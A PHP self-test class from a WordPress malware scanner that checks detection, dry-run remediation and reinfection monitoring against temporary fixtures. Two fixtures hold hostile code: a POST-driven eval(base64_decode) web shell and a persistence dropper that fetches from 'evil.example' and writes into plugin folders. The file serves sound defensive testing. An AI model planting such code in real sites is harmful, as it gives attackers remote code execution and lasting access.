<?php
/**
 * Five mandatory persistence / XDav scenarios (isolated fixtures — never infects live site).
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

class MVN_Persistence_Selftest {

	/**
	 * @return array{ok:bool,results:array[]}
	 */
	public static function run() {
		$base = mvn_data_dir() . '/fixtures/selftest-' . gmdate( 'YmdHis' );
		wp_mkdir_p( $base );
		$results = array();

		// Test 1: xdav-tracker.php detect by score.
		$malware = $base . '/xdav-tracker.php';
		@file_put_contents(
			$malware,
			"<?php\n/** Plugin Name: xdav-tracker */\nnamespace XDav;\nclass TrackerD { public function run(){ eval(base64_decode(\$_POST['x'])); file_put_contents(WP_CONTENT_DIR.'/mu-plugins/drop.php','<?php'); } }\n"
		);
		$rel1  = mvn_rel_path( $malware );
		$score = MVN_XDav_Signatures::score( 'wp-content/plugins/xdav-tracker/xdav-tracker.php', (string) file_get_contents( $malware ) );
		$results[] = array(
			'id'      => 1,
			'name'    => 'detect_xdav_tracker',
			'ok'      => MVN_XDav_Signatures::is_actionable( $score ),
			'detail'  => 'score=' . $score['score'] . ' signals=' . implode( ',', $score['signals'] ),
		);

		// Test 2: MU persistence writer.
		$mu = $base . '/cache-loader.php';
		@file_put_contents(
			$mu,
			"<?php\nfile_put_contents( WP_CONTENT_DIR . '/plugins/xdav-tracker.php', '<?php // drop' );\nwp_remote_get('https://evil.example/payload');\neval(base64_decode('YQ=='));\n"
		);
		$score2 = MVN_XDav_Signatures::score( 'wp-content/mu-plugins/cache-loader.php', (string) file_get_contents( $mu ) );
		$results[] = array(
			'id'     => 2,
			'name'   => 'detect_persistence_mu',
			'ok'     => in_array( 'persistence_write', $score2['signals'], true ) && $score2['score'] >= 50,
			'detail' => 'score=' . $score2['score'],
		);

		// Test 3: dry-run does not mutate.
		$before = is_file( $malware );
		$fake_id = md5( 'selftest|xdav' );
		$issues  = MVN_Incidents::issues();
		$issues[] = array(
			'id'     => $fake_id,
			'rel'    => 'wp-content/plugins/xdav-tracker/xdav-tracker.php',
			'sig'    => 'persistence_source',
			'action' => 'quarantine',
			'label'  => 'selftest',
			'persistence' => array(
				array( 'type' => 'file', 'path' => 'wp-content/mu-plugins/cache-loader.php', 'risk_score' => 96 ),
			),
		);
		MVN_Incidents::store_issues( $issues );
		$preview = MVN_Remediation::preview( $fake_id );
		$results[] = array(
			'id'     => 3,
			'name'   => 'dry_run_no_mutation',
			'ok'     => ! is_wp_error( $preview ) && ! empty( $preview['dry_run'] ) && $before && is_file( $malware ),
			'detail' => is_wp_error( $preview ) ? $preview->get_error_message() : implode( ' | ', $preview['lines'] ),
		);

		// Test 4: reinfection watch marks path.
		MVN_Reinfection_Monitor::watch( 'wp-content/plugins/xdav-tracker.php', $fake_id );
		$watched = MVN_Reinfection_Monitor::watched();
		$results[] = array(
			'id'     => 4,
			'name'   => 'reinfection_watch_registered',
			'ok'     => isset( $watched['wp-content/plugins/xdav-tracker.php'] ),
			'detail' => 'watched=' . count( $watched ),
		);

		// Test 5: benign base64_decode alone is not critical actionable.
		$benign = "<?php\n\$x = base64_decode('aGVsbG8=');\necho \$x;\n";
		$score5 = MVN_XDav_Signatures::score( 'wp-content/plugins/hello-safe/hello.php', $benign );
		$results[] = array(
			'id'     => 5,
			'name'   => 'benign_base64_not_critical',
			'ok'     => ! MVN_XDav_Signatures::is_actionable( $score5 ) && $score5['score'] < 61,
			'detail' => 'score=' . $score5['score'],
		);

		// Cleanup fixtures + unwatch.
		MVN_Reinfection_Monitor::unwatch( 'wp-content/plugins/xdav-tracker.php' );
		self::rrmdir( $base );

		$ok = true;
		foreach ( $results as $r ) {
			if ( empty( $r['ok'] ) ) {
				$ok = false;
			}
		}
		MVN_Security_Log::write( 'selftest', 'persistence', $ok ? 'pass' : 'fail' );
		return array( 'ok' => $ok, 'results' => $results );
	}

	private static function rrmdir( $dir ) {
		if ( ! is_dir( $dir ) ) {
			return;
		}
		$items = @scandir( $dir );
		if ( ! is_array( $items ) ) {
			return;
		}
		foreach ( $items as $item ) {
			if ( '.' === $item || '..' === $item ) {
				continue;
			}
			$path = $dir . '/' . $item;
			if ( is_dir( $path ) ) {
				self::rrmdir( $path );
			} else {
				@unlink( $path );
			}
		}
		@rmdir( $dir );
	}
}
